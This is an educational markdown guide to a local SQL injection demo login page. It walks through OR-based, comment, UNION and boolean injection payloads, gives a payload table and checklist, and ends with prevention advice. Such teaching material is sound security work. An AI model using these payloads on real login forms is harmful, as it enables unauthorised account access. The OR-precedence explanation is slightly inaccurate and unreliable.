# SQL Injection Demo Guide

## Overview

SQL Injection (SQLi) is a code injection technique that attacks data-driven applications by inserting malicious SQL statements into entry fields. This guide demonstrates how SQL injection can bypass authentication on a vulnerable login page.

**⚠️ Educational Use Only:** This guide is for learning purposes in controlled environments. Unauthorized access to computer systems is illegal.

---

## What is SQL Injection?

SQL injection occurs when an attacker inserts SQL code into input fields that are not properly sanitized or validated. The malicious SQL code is then executed by the database, potentially allowing unauthorized access or data manipulation.

### Basic Example

**Vulnerable Code:**
```sql
SELECT * FROM users WHERE username = 'input1' AND password = 'input2'
```

If the application doesn't sanitize user input, an attacker can inject SQL commands.

---

## Common SQL Injection Techniques

### 1. **OR-Based Injection** (Most Common for Login Bypass)

**Username:** `' OR '1'='1`  
**Password:** `anything`

**Query Executed:**
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
```

Since `'1'='1'` is always TRUE, the query returns all users, bypassing authentication.

---

### 2. **Comment-Based Injection**

**Username:** `admin'--`  
**Password:** `anything`

**Query Executed:**
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

The `--` comment operator ignores the password check entirely, allowing login as any user.

---

### 3. **UNION-Based Injection** (Data Extraction)

**Username:** `' UNION SELECT 'admin', 'password'--`  
**Password:** `anything`

This technique combines results from multiple SELECT statements to extract data.

---

### 4. **Boolean-Based Injection** (Time-Intensive)

**Username:** `' AND '1'='1`  
**Password:** `' AND '1'='1`

**Username:** `' AND '1'='2`  
**Password:** `' AND '1'='2`

Different responses based on TRUE/FALSE conditions reveal database structure.

---

## Why SQL Injection Works

1. **Insufficient Input Validation** - Application doesn't check what user enters
2. **Dynamic SQL Queries** - Queries are constructed by concatenating user input
3. **No Parameterized Queries** - Database doesn't separate code from data
4. **Error Messages** - Detailed error messages reveal database structure

---

## The Demo Login Page

The vulnerable bank login page (`bank_login.html`) contains a simulated user database:

```javascript
{
  username: "user",
  password: "password123",
  accountType: "Checking",
  balance: "$5,234.50"
}

{
  username: "admin",
  password: "admin123",
  accountType: "Admin",
  balance: "Full Access"
}

{
  username: "guest",
  password: "guest",
  accountType: "Guest",
  balance: "$0.00"
}
```

---

## Step-by-Step Demo Instructions

### Step 1: Load the Page

1. Open `bank_login.html` in your web browser
2. You should see a login form titled "Secure Bank Portal"
3. The page contains fields for Username and Password
4. There's also a section showing the SQL query being executed

### Step 2: Try Normal Login

First, try a legitimate login to see how it works:

**Username:** `user`  
**Password:** `password123`

You should see:
- ✓ Login successful message
- Account information displayed
- The executed SQL query shown at the bottom

### Step 3: Try OR-Based Injection

Now attempt the SQL injection:

**Username:** `' OR '1'='1`  
**Password:** `anything` (or leave blank)

**Expected Result:**
- ✓ Login successful (bypasses authentication!)
- The query at the bottom shows: `SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'`
- Account information from the first user is displayed

**Why it works:** The condition `'1'='1'` is always true, so the WHERE clause matches records regardless of username/password.

---

### Step 4: Try Comment-Based Injection

**Username:** `admin'--`  
**Password:** `anything` (or leave blank)

**Expected Result:**
- ✓ Login successful as admin!
- The query shows: `SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'`
- Admin account information is displayed

**Why it works:** The `--` comments out the password check, so you can login as admin without knowing the password.

---

### Step 5: Try Alternative Comment Syntax

**Username:** `admin'#`  
**Password:** `anything`

**Expected Result:**
- ✓ Login successful as admin!
- The `#` character also acts as a comment in some SQL implementations

---

### Step 6: Try UNION-Based Injection

**Username:** `' UNION SELECT 'user', 'password123', 'Checking', '$5,234.50'--`  
**Password:** `anything`

**Expected Result:**
- ✓ Login successful!
- The query combines results, potentially extracting data

---

### Step 7: Boolean-Based Testing

**Username:** `' AND 1=1`  
**Password:** `test`

Compare responses when testing `1=1` (true) vs `1=2` (false). Different responses indicate you can use this to extract data bit by bit.

---

## Common Injection Payloads to Try

| Injection | Username | Password | Result |
|-----------|----------|----------|--------|
| OR-based | `' OR '1'='1` | anything | Bypass with first user |
| Admin bypass | `admin'--` | anything | Login as admin |
| Alternative comment | `admin'#` | anything | Login as admin |
| Null comment | `admin'/*` | anything | Login as admin |
| Space bypass | `admin' --` | anything | Login as admin |

---

## Reading the Query Execution

The page displays the actual SQL query being executed. This helps you understand:

1. **What the backend is doing** with your input
2. **Why the injection works** (or doesn't work)
3. **How to craft better payloads**

**Example:** If you enter `' OR '1'='1` as username, you'll see:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything'
```

This query returns true because `'1'='1'` is always evaluated as TRUE.

---

## How to Prevent SQL Injection

### 1. **Use Parameterized Queries** (Prepared Statements)

**Vulnerable:**
```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
```

**Secure:**
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $_POST['username']);
$stmt->execute();
```

### 2. **Input Validation**

- Whitelist acceptable characters
- Validate data type (is it a number, email, etc?)
- Use length limits

```javascript
if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
    return "Invalid username format";
}
```

### 3. **Input Sanitization**

- Escape special characters
- Remove potentially dangerous characters
- Use database-specific escape functions

```php
$safe_username = mysqli_real_escape_string($conn, $_POST['username']);
```

### 4. **Least Privilege**

- Database user accounts should have minimal permissions
- Application should not use admin-level database accounts
- Separate read and write permissions

### 5. **Error Handling**

- Don't display detailed error messages to users
- Log errors securely for debugging
- Show generic error messages to users

```javascript
// Bad: Shows database structure
console.log("Database error: " + error);

// Good: Generic message
console.log("Authentication failed. Please try again.");
```

### 6. **Web Application Firewalls (WAF)**

- Deploy WAF to detect and block injection attempts
- Monitor for suspicious SQL patterns
- Block known attack signatures

---

## Real-World Examples

### The Sony PlayStation Network Hack (2011)

Over 77 million users' personal data was compromised due to SQL injection vulnerabilities. The attackers could:
- Access user credentials
- Steal personal information
- Modify account data

### TalkTalk Telecom Breach (2015)

Attackers used SQL injection to access customer data including:
- Names
- Dates of birth
- Phone numbers
- Bank account details

Impact: 157,000 customers affected, £42 million loss

---

## Testing Checklist

- [ ] Test with normal credentials
- [ ] Test OR '1'='1' injection
- [ ] Test admin'-- injection
- [ ] Test with comments (#, --, /*)
- [ ] Observe the SQL queries displayed
- [ ] Try creating your own payloads
- [ ] Understand why each injection works

---

## Additional Learning Resources

### OWASP Resources
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)

### Practice Platforms
- [DVWA (Damn Vulnerable Web Application)](http://www.dvwa.co.uk/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

### Tools
- [SQLMap](http://sqlmap.org/) - Automated SQL injection testing
- [Burp Suite](https://portswigger.net/burp) - Web proxy for manual testing
- [OWASP ZAP](https://www.zaproxy.org/) - Security scanning

---

## Key Takeaways

1. **SQL Injection is a critical vulnerability** - It's been #1 in OWASP Top 10 for years
2. **Input validation is essential** - Never trust user input
3. **Use parameterized queries** - They separate code from data
4. **Defense in depth** - Combine multiple security measures
5. **Test your applications** - Find vulnerabilities before attackers do

---

## Demo Instructions Summary

1. Open `bank_login.html` in browser
2. Try legitimate login: `user` / `password123`
3. Try SQL injection: `' OR '1'='1` / anything
4. Try admin bypass: `admin'--` / anything
5. Observe the SQL queries and results
6. Try creating your own payloads
7. Understand the patterns and why they work
8. Remember: **Always use parameterized queries in production!**

---

**Last Updated:** 2026-09-20  
**Intended For:** Educational security training only  
**Environment:** Safe, isolated learning environment
